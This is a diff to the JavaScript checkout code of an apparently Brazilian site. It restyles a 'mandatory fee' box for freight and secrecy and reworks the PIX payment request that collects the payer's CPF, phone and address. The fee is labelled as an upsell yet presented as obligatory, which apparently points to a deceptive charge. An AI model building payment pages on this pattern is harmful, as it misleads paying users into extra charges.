@@ -103,13 +103,15 @@ function showTaxaObrigatoriaUpsell() {
                         </p>
                     </div>
                     
-                    <!-- Info da taxa -->
-                    <div class="bg-gray-100 rounded-lg p-4 mb-6">
-                        <div class="flex items-center justify-between mb-2">
-                            <span class="text-gray-700 font-semibold">Taxa fixa (frete + sigilo)</span>
-                            <span class="text-3xl font-bold text-gray-800">R$ 81,20</span>
+                    <!-- Info da taxa - DESTAQUE COM BORDA VERMELHA -->
+                    <div class="border-4 border-red-500 rounded-lg p-4 mb-6 bg-white">
+                        <div class="flex items-center justify-between">
+                            <span class="text-gray-700 font-bold text-xs">Taxa fixa (frete + sigilo)</span>
+                            <div class="text-right">
+                                <span class="text-3xl font-bold text-gray-800">R$ 81,20</span>
+                            </div>
                         </div>
-                        <div class="flex items-center gap-2 text-green-600 font-semibold mt-3">
+                        <div class="flex items-center gap-2 text-green-600 font-semibold text-xs mt-3">
                             <i class="fas fa-lock"></i>
                             Documentação tratada com discrição total
                         </div>
@@ -139,13 +141,40 @@ async function gerarPixUpsellTaxaObrigatoria() {
     console.log('=== Gerando PIX de Taxa Obrigatória ===');
     
     try {
-        const userData = AVEN_API.getUserData();
+        // Verifica se AVEN_API existe, se não, usa função local
+        let userData;
+        if (typeof AVEN_API !== 'undefined' && AVEN_API.getUserData) {
+            userData = AVEN_API.getUserData();
+        } else {
+            // Fallback: busca dados do localStorage
+            userData = {
+                cpf: localStorage.getItem('cpf') || '12345678900',
+                nome: localStorage.getItem('nome') || localStorage.getItem('nomeCompleto') || 'Usuário Teste CAC',
+                telefone: localStorage.getItem('telefone') || '5511999999999',
+                email: localStorage.getItem('email') || 'teste@cac.com.br',
+                endereco: {
+                    estado: localStorage.getItem('estado') || 'SP',
+                    cidade: localStorage.getItem('cidade') || 'São Paulo',
+                    bairro: localStorage.getItem('bairro') || 'Centro',
+                    logradouro: localStorage.getItem('logradouro') || 'Rua Exemplo',
+                    numero: localStorage.getItem('numero') || '0',
+                    complemento: localStorage.getItem('complemento') || '',
+                    cep: localStorage.getItem('cep') || '00000000'
+                }
+            };
+        }
+        
         const externalRef = `upsell_taxa_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
         
         // Formata telefone
-        const telefoneFormatado = userData.telefone.startsWith('+55') 
-            ? userData.telefone 
-            : `+55${userData.telefone}`;
+        let telefoneFormatado = userData.telefone.toString().replace(/\D/g, '');
+        if (!telefoneFormatado.startsWith('55')) {
+            telefoneFormatado = '55' + telefoneFormatado;
+        }
+        telefoneFormatado = '+' + telefoneFormatado;
+        
+        // Formata CPF
+        const cpfFormatado = userData.cpf.toString().replace(/\D/g, '');
         
         const payload = {
             amount: UPSELL_CONFIG.amount,
@@ -154,10 +183,10 @@ async function gerarPixUpsellTaxaObrigatoria() {
             description: UPSELL_CONFIG.description,
             externalRef: externalRef,
             notificationUrl: window.location.origin + '/webhook/payment',
-            ip: await AVEN_API.getClientIP(),
+            ip: await (typeof AVEN_API !== 'undefined' ? AVEN_API.getClientIP() : '0.0.0.0'),
             payer: {
                 name: userData.nome,
-                taxId: userData.cpf,
+                taxId: cpfFormatado,
                 email: userData.email,
                 phone: telefoneFormatado
             },
@@ -179,7 +208,7 @@ async function gerarPixUpsellTaxaObrigatoria() {
                     street: userData.endereco.logradouro || 'Rua Exemplo',
                     number: userData.endereco.numero || '0',
                     complement: userData.endereco.complemento || '',
-                    zipCode: userData.endereco.cep || '00000000'
+                    zipCode: userData.endereco.cep.toString().replace(/\D/g, '') || '00000000'
                 }
             },
             metadata: {
@@ -205,18 +234,19 @@ async function gerarPixUpsellTaxaObrigatoria() {
         
         console.log('Status:', response.status);
         const responseText = await response.text();
-        console.log('Response:', responseText);
+        console.log('Response completa:', responseText);
         
         let data;
         try {
             data = JSON.parse(responseText);
         } catch (e) {
+            console.error('Erro ao parsear response:', e);
             data = { message: responseText };
         }
         
         if (!response.ok) {
             console.error('Erro da API:', data);
-            throw new Error(data.message || `Erro ${response.status}`);
+            throw new Error(data.message || `Erro ${response.status}: ${response.statusText}`);
         }
         
         console.log('✅ PIX de upsell gerado:', data);
@@ -239,8 +269,9 @@ async function gerarPixUpsellTaxaObrigatoria() {
         showUpsellPixPayment(data);
         
     } catch (error) {
-        console.error('❌ Erro:', error);
-        alert('Erro ao gerar PIX. Tente novamente.');
+        console.error('❌ Erro completo:', error);
+        console.error('Stack:', error.stack);
+        alert('Erro ao gerar PIX: ' + error.message);
     }
 }
 
